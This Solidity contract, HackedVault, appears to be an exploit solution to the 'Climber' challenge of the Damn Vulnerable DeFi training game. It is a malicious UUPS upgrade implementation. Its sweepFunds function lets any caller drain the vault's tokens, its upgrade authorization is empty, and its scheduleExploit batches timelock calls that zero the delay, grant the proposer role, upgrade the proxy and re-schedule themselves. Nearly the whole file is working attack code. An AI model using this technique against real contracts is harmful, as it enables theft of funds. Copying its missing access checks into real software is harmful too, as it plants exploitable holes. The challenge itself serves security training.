// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "solady/src/utils/SafeTransferLib.sol";

import "./ClimberTimelock.sol";
import {WITHDRAWAL_LIMIT, WAITING_PERIOD} from "./ClimberConstants.sol";
import {CallerNotSweeper, InvalidWithdrawalAmount, InvalidWithdrawalTime} from "./ClimberErrors.sol";

/**
 * @title ClimberVault
 * @dev To be deployed behind a proxy following the UUPS pattern. Upgrades are to be triggered by the owner.
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract HackedVault is Initializable, OwnableUpgradeable, UUPSUpgradeable {
    uint256 private _lastWithdrawalTimestamp;
    address private _sweeper;

    modifier onlySweeper() {
        if (msg.sender != _sweeper) {
            revert CallerNotSweeper();
        }
        _;
    }

    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() {
        _disableInitializers();
    }

    function initialize(
        address admin,
        address proposer,
        address
    ) external initializer {
        // Initialize inheritance chain
        __Ownable_init();
        __UUPSUpgradeable_init();

        // Deploy timelock and transfer ownership to it
        transferOwnership(address(new ClimberTimelock(admin, proposer)));
    }

    // Allows trusted sweeper account to retrieve any tokens
    function sweepFunds(address sweeper, address token) external {
        SafeTransferLib.safeTransfer(
            token,
            sweeper,
            IERC20(token).balanceOf(address(this))
        );
    }

    function _authorizeUpgrade(
        address newImplementation
    ) internal virtual override {}

    // Assumed to be called by a timelock after granting this contract a proposer role
    function scheduleExploit(address timelock, address hacked, address proxy) external {

        uint256 len = 4;
        address[] memory targets = new address[](len);
        uint256[] memory values = new uint256[](len);
        bytes[] memory dataElements = new bytes[](len);

        targets[0] = address(timelock); // updateDelay() call
        targets[1] = address(timelock); // grantRole() call
        targets[2] = address(proxy); // updgradeTo() call
        targets[3] = address(proxy); // scheduleExploit() call

        // No value transfer, only tokens
        for(uint256 i=0;i<targets.length;i++)
            values[i] = 0;

        dataElements[0] = abi.encodeWithSelector(ClimberTimelock.updateDelay.selector, 0);
        dataElements[1] = abi.encodeWithSelector(AccessControl.grantRole.selector, PROPOSER_ROLE, address(proxy));
        dataElements[2] = abi.encodeWithSelector(UUPSUpgradeable.upgradeTo.selector, address(hacked));
        dataElements[3] = abi.encodeWithSelector(HackedVault.scheduleExploit.selector, timelock, hacked, proxy);

        ClimberTimelock(payable(timelock)).schedule(targets, values, dataElements, 0);
    }
}
